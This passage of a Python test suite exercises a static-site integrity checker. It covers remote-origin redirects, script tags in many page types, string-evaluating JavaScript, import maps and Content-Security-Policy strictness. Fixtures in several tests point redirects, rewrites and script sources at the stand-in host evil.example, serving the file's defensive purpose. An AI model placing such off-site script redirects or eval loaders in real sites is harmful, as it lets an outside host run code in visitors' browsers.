    c_ok('C3: _redirects to an outside origin', c_room('c3a', '<html><head>' + _m() + _PIN + '</head></html>', files={'_redirects': '/go.js https://cdn.jsdelivr.net/npm/x@1/x.js 302\n'}), 'DRIFT', OUT)
    c_ok('C3: _redirects local SPA fallback = OK', c_room('c3b', '<html><head>' + _m() + _PIN + '</head></html>', files={'_redirects': '# c\n/*    /index.html   200\n'}), 'OK')
    c_ok('C3: _redirects protocol-relative', c_room('c3c', '<html><head>' + _m() + _PIN + '</head></html>', files={'_redirects': '/a //evil.example/a 301\n'}), 'DRIFT', OUT)
    c_ok('C3: firebase.json rewrite to a remote destination', c_room('c3d', '<html><head>' + _m() + _PIN + '</head></html>', files={'firebase.json': json.dumps({'hosting': [{'rewrites': [{'source': '/x.js', 'destination': 'https://evil.example/x.js'}]}]})}), 'DRIFT', OUT)
    c_ok('C3: firebase.json local rewrite = OK', c_room('c3e', '<html><head>' + _m() + _PIN + '</head></html>', files={'firebase.json': json.dumps({'hosting': {'rewrites': [{'source': '**', 'destination': '/index.html'}]}})}), 'OK')
    c_ok('C3: netlify.toml redirect', c_room('c3f', '<html><head>' + _m() + _PIN + '</head></html>', files={'netlify.toml': '[[redirects]]\nfrom = "/a.js"\nto = "https://evil.example/a.js"\n'}), 'DRIFT', OUT)
    c_ok('C3: vercel.json redirect', c_room('c3g', '<html><head>' + _m() + _PIN + '</head></html>', files={'vercel.json': json.dumps({'redirects': [{'source': '/a.js', 'destination': 'https://evil.example/a.js'}]})}), 'DRIFT', OUT)
    c_ok('C3: _headers Location to an outside origin', c_room('c3h', '<html><head>' + _m() + _PIN + '</head></html>', files={'_headers': '/a.js\n  Location: https://evil.example/a.js\n'}), 'DRIFT', OUT)
    c_ok('worker-src *', c_room('w1', '<html><head>' + _m('', '; worker-src *') + _PIN + '</head></html>'), 'DRIFT', 'worker-src has *')
    c_ok('child-src https:', c_room('w2', '<html><head>' + _m('', '; child-src https:') + _PIN + '</head></html>'), 'DRIFT', 'child-src has https:')
    c_ok("worker-src 'self' = OK", c_room('w3', '<html><head>' + _m('', "; worker-src 'self'") + _PIN + '</head></html>'), 'OK')

# N1-N6 unit rooms beyond adv9
with tempfile.TemporaryDirectory() as t:
    def n_room(name, html, files=None, shell=None, page='index.html'):
        d = os.path.join(t, name); os.makedirs(d)
        json.dump({'siteId': name, 'shell': shell or {'base': V}}, open(os.path.join(d, 'site.json'), 'w'))
        if page != 'index.html':
            open(os.path.join(d, 'index.html'), 'w').write('<html><head>%s</head></html>' % pinned)
        open(os.path.join(d, page), 'wb').write(html if isinstance(html, bytes) else html.encode())
        for k, v in (files or {}).items():
            write(d, k, v)
        return run(d)
    base_ = '<html><head>%s%s</head></html>'
    r = n_room('n1_metacharset', base_ % ('<meta charset="windows-1252">', pinned))
    ok(r['status'] == 'DRIFT' and any('charset' in x for x in r['findings']), 'N1: <meta charset=windows-1252> = DRIFT (%s)' % r['findings'])
    r = n_room('n1_httpequiv', base_ % ('<meta http-equiv="Content-Type" content="text/html; charset=utf-16">', pinned))
    ok(r['status'] == 'DRIFT' and any('charset' in x for x in r['findings']), 'N1: http-equiv Content-Type charset=utf-16 = DRIFT (%s)' % r['findings'])
    r = n_room('n1_utf8ok', base_ % ('<meta charset="UTF-8">', pinned))
    ok(r['status'] == 'OK', 'N1: <meta charset=UTF-8> = OK (%s)' % r['findings'])
    r = n_room('n1_nul', (base_ % ('', pinned)).replace('</html>', '<p>a\x00b</p></html>'))
    ok(r['status'] == 'DRIFT' and any('NUL bytes' in x for x in r['findings']), 'N1: a NUL byte in a page = DRIFT (%s)' % r['findings'])
    r = n_room('n1_utf32', b'\xff\xfe\x00\x00' + (base_ % ('', pinned)).encode('utf-32-le'))
    ok(r['status'] == 'DRIFT' and any('UTF-32' in x for x in r['findings']), 'N1: a UTF-32 BOM page = DRIFT')
    r = n_room('n1_badutf8', (base_ % ('', pinned)).encode().replace(b'</html>', b'<p>\xff</p></html>'))
    ok(r['status'] == 'DRIFT' and any('not valid UTF-8' in x for x in r['findings']), 'N1: invalid UTF-8 bytes = DRIFT')
    r = n_room('n1_js_utf16', base_ % ('', pinned + '<script src="takedown.js"></script>'),
               files={'takedown.js': b'\xff\xfe' + 'var a=1;'.encode('utf-16-le')})
    ok(r['status'] == 'DRIFT' and any('takedown.js has a UTF-16 byte-order mark' in x for x in r['findings']), 'N1: a UTF-16 room JS file = DRIFT (%s)' % r['findings'])
    # N2: every served page type is scanned
    for ext in ('.xhtml', '.svg', '.shtml', '.htm', '.xml', '.php'):
        r = n_room('n2' + ext.replace('.', '_'), '<html><script src="https://evil.example/x.js"></script></html>', page='promo' + ext)
        ok(r['status'] == 'DRIFT' and any('evil.example' in x for x in r['findings']), 'N2: a remote script in a %s page = DRIFT' % ext)
    r = n_room('n2_svg_xscript', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:x="http://www.w3.org/2000/svg"><x:script href="https://evil.example/x.js"/></svg>', page='logo.svg')
    ok(r['status'] == 'DRIFT', 'N2: a prefixed <x:script> in an .svg = DRIFT (%s)' % r['findings'])
    r = n_room('n2_xslt', '<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="x.xsl"?><r/>', page='feed.xml')
    ok(r['status'] == 'DRIFT' and any('xml-stylesheet' in x for x in r['findings']), 'N2: an XSLT <?xml-stylesheet> = DRIFT (%s)' % r['findings'])
    r = n_room('n2_svg_ok', '<svg xmlns="http://www.w3.org/2000/svg"><path d="M0 0"/></svg>', page='logo.svg')
    ok(r['status'] == 'OK', 'N2: a plain .svg icon = OK (%s)' % r['findings'])
    # N5: noShell keep files never evaluate strings
    for nm, code in (('settimeout', 'setTimeout("alert(1)", 9);'), ('setinterval', "setInterval('x()', 9);"),
                     ('docwrite', 'document.write("<p>");'), ('docwrite_br', "document['write']('<p>');"),
                     ('function', 'var f = Function("return 1");'), ('newfunction', 'var f = new Function("return 1");'),
                     ('eval', 'eval(x);')):
        r = n_room('n5_' + nm, '<html><head><script src="k.js"></script></head></html>', page='terms.html',
                   files={'k.js': code.encode()},
                   shell={'base': V, 'noShell': ['terms.html'], 'keep': [{'file': 'k.js', 'sha256': sha(code.encode()), 'reason': 't'}]})
        ok(r['status'] == 'DRIFT' and any('evaluates a string as code' in x for x in r['findings']), 'N5: noShell keep file with %s = DRIFT (%s)' % (code, r['findings']))
    code = 'setTimeout(function () { go(); }, 9); var f = function (a) { return a; };'
    r = n_room('n5_ok', '<html><head><script src="k.js"></script></head></html>', page='terms.html', files={'k.js': code.encode()},
               shell={'base': V, 'noShell': ['terms.html'], 'keep': [{'file': 'k.js', 'sha256': sha(code.encode()), 'reason': 't'}]})
    ok(r['status'] == 'OK', 'N5: setTimeout(function...) and lowercase function( stay OK (%s)' % r['findings'])
    # N6: import maps
    im = '<script type="importmap">{"imports": {"a": "./lib/a.js"}}</script>'
    r = n_room('n6_default', base_ % (im, pinned))
    ok(r['status'] == 'DRIFT' and any('importmap' in x for x in r['findings']), 'N6: an import map without shell.importmap = DRIFT')
    im_txt = '{"imports": {"a": "./lib/a.js"}}'
    r = n_room('n6_declared', base_ % (im, pinned), shell={'base': V, 'importmap': True, 'overrides': {'inline': [{'page': 'index.html', 'sha256': sha(im_txt.encode()), 'reason': 't'}]}})
    ok(r['status'] == 'OK', 'N6: a local import map with shell.importmap:true = OK (%s)' % r['findings'])
    r = n_room('n6_remote', base_ % ('<script type="importmap">{"imports": {"a": "https://evil.example/a.js"}}</script>', pinned), shell={'base': V, 'importmap': True})
    ok(r['status'] == 'DRIFT' and any('import map points' in x for x in r['findings']), 'N6: a declared import map pointing off-site = DRIFT')
    r = n_room('n6_src', base_ % ('<script type="importmap" src="m.json"></script>', pinned), shell={'base': V, 'importmap': True})
    ok(r['status'] == 'DRIFT', 'N6: an external import map = DRIFT')
    # N3: the pin in <head> or <body> = OK; extra attributes or any other parent = DRIFT
    for nm, html, want in (('head', '<html><head>%s</head></html>' % pinned, 'OK'),
                           ('body', '<html><body>%s</body></html>' % pinned, 'OK'),
                           ('div', '<html><body><div>%s</div></body></html>' % pinned, 'DRIFT'),
                           ('defer', '<html><head>%s</head></html>' % pinned.replace('<script ', '<script defer '), 'DRIFT'),
                           ('selfclose_title', '<html><head><title/>%s</head></html>' % pinned, 'DRIFT')):
        r = n_room('n3_' + nm, html)
        ok(r['status'] == want, 'N3: pin %s = %s (%s)' % (nm, want, r['findings']))
ok(SD.INJECT_RE.search('x = Function("a")') and not SD.INJECT_RE.search('var f = function("a") {}'), 'N5: INJECT_RE flags Function( (case-sensitive), not function(')
ok(SD.IMPORT_RE.search('x;\ufeffimport "https://e.example/x.js"') is not None, 'N4: U+FEFF before import counts as whitespace')

# ---- CSP rule: cspRequired defaults to true; legacy list; strict policy; emoji forms ----
def csp_hashes(d):
    hs = set()
    for _, pg in SD.pages(d):
        for s_ in pg.out:
            if s_['attrs'].get('src') is None and s_['text'].strip():
                hs.add(sorted(SD.script_hash_sources(s_['text']))[0])
    return sorted(h for h in hs if h.startswith("'sha256-"))


def with_csp(d, script_src, extra="object-src 'none'; base-uri 'none'", where='head'):
    pol = "script-src %s; %s" % (script_src, extra)
    meta = '<meta http-equiv="Content-Security-Policy" content="%s">' % pol
    for fn in os.listdir(d):
        if fn.endswith('.html'):
            p = os.path.join(d, fn); h = open(p, encoding='utf-8').read()
            if where == 'head':
                h = re.sub(r'(<head[^>]*>)', lambda m_: m_.group(1) + meta, h, count=1)
            elif where == 'body':
                h = h.replace('</body>', meta + '</body>', 1)
            open(p, 'w', encoding='utf-8').write(h)
    return pol


PIN_DIR = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/shell/%s/' % ('0' * 40, V)
FBSRC = 'https://www.gstatic.com/firebasejs/10.12.2/'


def strict_src(d, emoji='https://cdn.jsdelivr.net/npm/emoji-picker-element@1.29.1/'):
    return ' '.join(["'self'", PIN_DIR, FBSRC] + ([emoji] if emoji else []) + csp_hashes(d))


def site_set(d, **kw):
    s_ = json.load(open(os.path.join(d, 'site.json')))
    for k, v in kw.items():
        if k == 'shell_cspRequired':
            s_['shell']['cspRequired'] = v
        else:
            s_[k] = v
    json.dump(s_, open(os.path.join(d, 'site.json'), 'w'))


def csp_case(label, prep, legacy, want, f_needle=None, w_needle=None, no_w=None):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, 'gaichat'); shutil.copytree(os.path.join(REAL, 'gaichat'), d)
        prep(d)
        r = run(d, csp=True, legacy=legacy)
        good = r['status'] == want
        if f_needle:
            good = good and any(f_needle in x for x in r['findings'])
        if w_needle:
            good = good and any(w_needle in x for x in r['warnings'])
        if no_w:
            good = good and not any(no_w in x for x in r['warnings'] + r['findings'])
        ok(good, 'CSP: %s = %s (%s %s)' % (label, want, r['findings'][:3], r['warnings'][:3]))
        return r


nop = lambda d: None
LEG = ['gaichat']
csp_case('legacy room, no CSP', nop, LEG, 'WARN', w_needle='CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Content-Security-Policy on 17 of 17 pages')
csp_case('same room off the legacy list (hub, topic mode, new spin-up), no CSP', nop, [], 'DRIFT', f_needle='CSP rule: no Content-Security-Policy on 17 of 17 pages')
csp_case('cspRequired:false off the legacy list', lambda d: site_set(d, cspRequired=False), [], 'DRIFT', f_needle='cspRequired:false is allowed only for rooms on tools/csp_legacy_rooms.json')
csp_case('cspRequired:false on the legacy list', lambda d: site_set(d, cspRequired=False), LEG, 'WARN', w_needle='CSP rule (legacy room')
csp_case('cspRequired:true on the legacy list enforces', lambda d: site_set(d, shell_cspRequired=True), LEG, 'DRIFT', f_needle='CSP rule: no Content-Security-Policy')
csp_case('cspRequired:"yes"', lambda d: site_set(d, cspRequired='yes'), LEG, 'DRIFT', f_needle='cspRequired must be true or false')
csp_case('site.json and shell cspRequired disagree', lambda d: (site_set(d, cspRequired=True), site_set(d, shell_cspRequired=False)), LEG, 'DRIFT', f_needle='disagree')
# strict meta on every page: CSP passes; emoji@1 is a mutable range, so the emoji WARN stays
r = csp_case('strict meta CSP, room off the list', lambda d: with_csp(d, strict_src(d)), [], 'WARN', w_needle='emoji-picker-element@1 has no SRI pin', no_w='CSP rule')
r = csp_case('strict header CSP (firebase.json), room off the list', lambda d: json.dump({'hosting': {'headers': [{'source': '**', 'headers': [
    {'key': 'Content-Security-Policy', 'value': "script-src %s; object-src 'none'; base-uri 'none'" % strict_src(d)}]}]}},
    open(os.path.join(d, 'firebase.json'), 'w')), [], 'WARN', no_w='CSP rule')
r = csp_case('strict _headers CSP, room off the list', lambda d: open(os.path.join(d, '_headers'), 'w').write(
    "/*\n  Content-Security-Policy: script-src %s; object-src 'none'; base-uri 'none'\n" % strict_src(d)), [], 'WARN', no_w='CSP rule')


def emoji_exact(d, ver='1.29.1', integrity=None):
    p = os.path.join(d, 'index.html'); h = open(p, encoding='utf-8').read()
    h = h.replace('emoji-picker-element@1/index.js"', 'emoji-picker-element@%s/index.js"%s' % (ver, ' integrity="%s" crossorigin="anonymous"' % integrity if integrity else ''))
    open(p, 'w', encoding='utf-8').write(h)


csp_case('emoji at its exact version path in a strict script-src clears the emoji WARN', lambda d: (emoji_exact(d), with_csp(d, strict_src(d))), [], 'OK', no_w='emoji')
csp_case('emoji exact version, CSP lists a different version', lambda d: (emoji_exact(d), with_csp(d, strict_src(d, 'https://cdn.jsdelivr.net/npm/emoji-picker-element@1.29.0/'))), [], 'WARN', w_needle='emoji-picker-element@1.29.1 has no SRI pin')
csp_case('emoji exact version with SRI on the CDN but its folder not in script-src = WARN', lambda d: (emoji_exact(d, integrity='sha384-' + 'A' * 64), with_csp(d, strict_src(d, 'https://cdn.jsdelivr.net/npm/emoji-picker-element@1.29.0/'))), [], 'WARN', w_needle='emoji-picker-element@1.29.1 has no SRI pin')
csp_case('emoji range @1 in script-src stays weak', lambda d: with_csp(d, strict_src(d, 'https://cdn.jsdelivr.net/npm/emoji-picker-element@1/')), [], 'DRIFT', f_needle='emoji-picker-element@1/ is not allowed')


def emoji_self(d, integrity):
    write(d, 'vendor/emoji-picker-element/index.js', b'export default 1;\n')
    p = os.path.join(d, 'index.html'); h = open(p, encoding='utf-8').read()
    h = h.replace('src="https://cdn.jsdelivr.net/npm/emoji-picker-element@1/index.js"', 'src="vendor/emoji-picker-element/index.js"%s' % (' integrity="sha384-%s"' % base64.b64encode(hashlib.sha384(b'export default 1;\n').digest()).decode() if integrity else ''))
    open(p, 'w', encoding='utf-8').write(h)
    s_ = json.load(open(os.path.join(d, 'site.json')))
    s_['shell'].setdefault('keep', []).append({'file': 'vendor/emoji-picker-element/index.js', 'sha256': sha(b'export default 1;\n'), 'reason': 'self-hosted emoji picker'})
    json.dump(s_, open(os.path.join(d, 'site.json'), 'w'))
    with_csp(d, strict_src(d, None))


csp_case("self-hosted emoji-picker-element ('self' file with SRI) clears the emoji WARN", lambda d: emoji_self(d, True), [], 'OK', no_w='emoji')
csp_case('self-hosted emoji-picker-element without SRI = WARN', lambda d: emoji_self(d, False), [], 'WARN', w_needle='self-hosted vendor/emoji-picker-element/index.js has no integrity')
# weak policies: jsDelivr forms short of the full 40-char pinned path are WARN on the legacy list, DRIFT off it
for nm, src_ in (('bare host', 'https://cdn.jsdelivr.net'), ('repo path', 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory/'),
                 ('tag', 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@v1.2.0/'), ('branch', 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@main/'),
                 ('short sha', 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@0000000/')):
    mk = lambda d, src_=src_: with_csp(d, strict_src(d) + ' ' + src_)  # the pin dir stays listed, so the pin still runs
    csp_case('script-src %s, legacy room' % nm, mk, LEG, 'WARN', w_needle='is not the full pinned path with the 40-char commit SHA')
    csp_case('script-src %s, room off the list' % nm, mk, [], 'DRIFT', f_needle='is not the full pinned path with the 40-char commit SHA')
for nm, prep, needle in (
        ("'unsafe-inline'", lambda d: with_csp(d, strict_src(d) + " 'unsafe-inline'"), "has 'unsafe-inline'"),
        ("'unsafe-eval'", lambda d: with_csp(d, strict_src(d) + " 'unsafe-eval'"), "has 'unsafe-eval'"),
        ('a nonce', lambda d: with_csp(d, strict_src(d) + " 'nonce-abc'"), 'has a nonce'),
        ('a wildcard', lambda d: with_csp(d, strict_src(d) + ' https:'), 'is not allowed in a strict CSP'),
        ('a hash that matches no inline script', lambda d: with_csp(d, strict_src(d) + " 'sha256-%s'" % ('A' * 43 + '=')), 'matches no redirect-stub or 404.html inline script'),
        ('no pin path', lambda d: with_csp(d, strict_src(d).replace(PIN_DIR + ' ', '')), "does not list this page's pin folder"),
        ("no object-src 'none'", lambda d: with_csp(d, strict_src(d), "base-uri 'none'"), "object-src is not 'none'"),
        ("no base-uri 'none'", lambda d: with_csp(d, strict_src(d), "object-src 'none'"), "base-uri is not 'none'"),
        ('meta CSP in <body>', lambda d: with_csp(d, strict_src(d), where='body'), 'not the first element in <head>')):
    csp_case('weak CSP: %s, room off the list' % nm, prep, [], 'DRIFT', f_needle=needle)
with tempfile.TemporaryDirectory() as t:  # a fresh room (hub / topic mode / new spin-up shape) starts DRIFT without a CSP
    r = run(room(t, 'newroom', pinned, {'base': V}), csp=True)
    ok(r['status'] == 'DRIFT' and any(x.startswith('CSP rule: no Content-Security-Policy on 1 of 1 pages') for x in r['findings']), 'CSP: a new room off the list starts DRIFT (%s)' % r['findings'])
    d = room(t, 'newroom2', pinned, {'base': V})
    h = open(os.path.join(d, 'index.html')).read().replace('<html>', '<html><head><meta http-equiv="Content-Security-Policy" content="script-src \'self\' %s %s; object-src \'none\'; base-uri \'none\'"></head>' % (PIN_DIR, FBSRC))
    open(os.path.join(d, 'index.html'), 'w').write(h)
    r = run(d, csp=True); ok(r['status'] == 'OK', 'CSP: a new room with the shell/csp.md meta = OK (%s %s)' % (r['findings'], r['warnings']))
    h2 = h.replace('content="script-src', 'content="default-src \'self\'; script-src').replace('<head>', '<head><script>var a=1</script>')
    open(os.path.join(d, 'index.html'), 'w').write(h2)
    r = run(d, csp=True); ok(r['status'] == 'DRIFT' and any('not the first element in <head>' in x for x in r['findings']), 'CSP: a meta CSP after a <script> = DRIFT (%s)' % r['findings'])
    hsrc = sorted(SD.script_hash_sources('var a=1'))[0]
    open(os.path.join(d, 'index.html'), 'w').write(h.replace("base-uri 'none'", "base-uri 'none'").replace(FBSRC, FBSRC + ' ' + hsrc).replace('</body>', '<script>var a=1</script></body>'))
    r = run(d, csp=True); ok(r['status'] == 'DRIFT' and any('matches no redirect-stub or 404.html inline script' in x for x in r['findings']),
                             'CSP: a hash for an inline script on a normal page = DRIFT (only stub and 404.html scripts may be hashed) (%s)' % r['findings'][:2])
    open(os.path.join(d, 'index.html'), 'w').write(h.replace('</body>', '<img src="x.png" onerror="go()"></body>'))
    r = run(d, csp=True); ok(any(x.startswith('CSP rule: index.html:1 <img onerror=>') for x in r['warnings']),
                             'CSP: an inline handler on a strict-CSP page gets a CSP WARN (%s)' % r['warnings'])
leg = json.load(open(os.path.join(ROOT, 'tools', 'csp_legacy_rooms.json')))
ok(len(leg['rooms']) == 20 and 'migration PR' in leg['_comment'], 'tools/csp_legacy_rooms.json lists the 20 existing rooms')
csp_md = open(os.path.join(ROOT, 'shell', 'csp.md')).read()
m_ = re.search(r'content="([^"]+)"', csp_md)
csp_ex = re.sub(r" 'sha256-<[^>]*>'", '', m_.group(1).replace('<FULL_MERGE_SHA>', '0' * 40)) if m_ else ''
ok(m_ is not None and SD.csp_policies(csp_ex) and not SD.csp_weak(SD.csp_policies(csp_ex)[0], set(), True, {PIN_DIR}), 'shell/csp.md meta tag is strict (with the merge SHA filled in)')

# ---- validators: $-anchored patterns are only ever used with fullmatch (Python's $ also matches before a trailing \n) ----
good_pin = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@' + '0' * 40 + '/shell/v1.2.6/factory.js'
ok(SD.PIN_RE.fullmatch(good_pin) and not SD.PIN_RE.fullmatch(good_pin + '\n') and SD.EXACT_VER.fullmatch('1.2.6') and not SD.EXACT_VER.fullmatch('1.2.6\n'),
   'shell_drift: pin URL / exact version with a trailing newline do not validate')
anch = re.compile(r"^(\w+)\s*=\s*re\.compile\(\s*r?(['\"])(.*?)\2", re.M)
bad_uses = []
for rel in sorted([os.path.join('tools', f) for f in os.listdir(os.path.join(ROOT, 'tools')) if f.endswith('.py')] + [os.path.join('build', 'whomark.py')]):
    src = open(os.path.join(ROOT, rel), encoding='utf-8').read()
    for m in anch.finditer(src):
        if m.group(3).endswith('$') and re.search(r'\b%s\.match\(' % re.escape(m.group(1)), src):
            bad_uses.append('%s:%s' % (rel, m.group(1)))
ok(not bad_uses, 'no $-anchored validator regex in tools/ or build/whomark.py is used with .match() (%s)' % bad_uses)

print('\n%d failure(s)' % len(fails))
sys.exit(1 if fails else 0)
